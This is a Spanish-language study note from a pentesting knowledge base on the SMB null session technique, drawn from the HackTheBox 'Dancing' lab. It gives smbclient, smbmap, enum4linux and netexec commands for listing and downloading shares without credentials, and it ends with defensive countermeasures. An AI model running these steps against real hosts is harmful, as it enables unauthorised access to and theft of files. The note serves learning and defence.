---
tags:
  - tecnica
  - categoria/discovery
  - categoria/lateral-movement
  - os/windows
  - nivel/basico
fecha_aprendida: 2026-06-11
fuente: HTB/Dancing
mitre_technique: T1021.002
---
# ⚔️ SMB Null Session

> [!abstract] Resumen
> Conexión a shares SMB de Windows sin proveer credenciales (`-N` / usuario nulo). Permite listar y leer archivos si el share no restringe acceso a `Everyone`/`Anonymous Logon`.

---

## ¿Qué es y por qué funciona?

SMB permite autenticación anónima (null session) si el host o el share específico no la deshabilita explícitamente. Windows históricamente permitía enumeración de shares, usuarios y políticas vía null session salvo que `RestrictAnonymous` esté configurado. Si un share tiene permisos abiertos a `Everyone`, cualquier cliente sin credenciales puede listar y descargar su contenido — el protocolo no exige autenticación exitosa para esa operación, solo autorización a nivel de share.

---

## Condiciones necesarias para que aplique

> [!warning] Requisitos
> - Puerto 445/TCP (SMB) accesible
> - `RestrictAnonymous` no configurado en modo estricto (valor 2) en el registro del host
> - Al menos un share con permisos que incluyan `Everyone` o `Anonymous Logon`

---

## Procedimiento

### Detección / Enumeración

```bash
nmap -sCV -p 139,445 <IP>
# Buscar en output: smb2-security-mode, smb-os-discovery

smbclient -L <IP> -N
# Lista shares disponibles sin autenticación (-N = null session)
```

### Explotación

```bash
# Paso 1: listar shares
smbclient -L <IP> -N

# Paso 2: conectar al share de interés
smbclient //<IP>/<ShareName> -N

# Paso 3: navegar y extraer archivos
smb: \> ls
smb: \> cd <directorio>
smb: \> get <archivo>

# Paso 4: leer localmente (! = shell escape, ejecuta en tu máquina, no en el target)
smb: \> !cat <archivo>
```

> [!tip] Variaciones comunes
> - `IPC$` nunca lista archivos — es un pipe RPC, no un share de datos. `NT_STATUS_NO_SUCH_FILE` ahí es esperado.
> - Si `-N` falla en todos los shares, probar `smbmap -H <IP>` o credenciales de invitado (`guest`/vacío)
> - `enum4linux -a <IP>` para enumeración más profunda (usuarios, políticas, RID cycling)

---

## Herramientas asociadas

| Herramienta | Función | Comando base |
| ----------- | ------- | ------------ |
| smbclient | Cliente SMB interactivo tipo FTP | `smbclient //<IP>/<share> -N` |
| smbmap | Enumeración de shares y permisos en batch | `smbmap -H <IP>` |
| enum4linux | Enumeración extendida (usuarios, RID, políticas) | `enum4linux -a <IP>` |
| crackmapexec/netexec | Validación de acceso SMB masivo | `nxc smb <IP> -u '' -p ''` |

---

## Contramedidas (defensa)

> [!info] ¿Cómo se previene?
> `RestrictAnonymous = 2` en `HKLM\SYSTEM\CurrentControlSet\Control\LSA`. Retirar `Everyone`/`Anonymous Logon` de las ACL de shares. Forzar SMB Signing (previene relay). Auditar acceso a objetos (Event ID 4663) y monitorear Event ID 4624 con Logon Type 3 + cuenta `ANONYMOUS LOGON`.

---

## Dónde la usé

- `[[HTB/Dancing/Dancing]]` — Share `WorkShares` accesible sin autenticación, flag en subdirectorio de usuario

---

## Referencias

- [HackTricks - SMB](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)
- [MITRE ATT&CK - T1021.002](https://attack.mitre.org/techniques/T1021/002/)
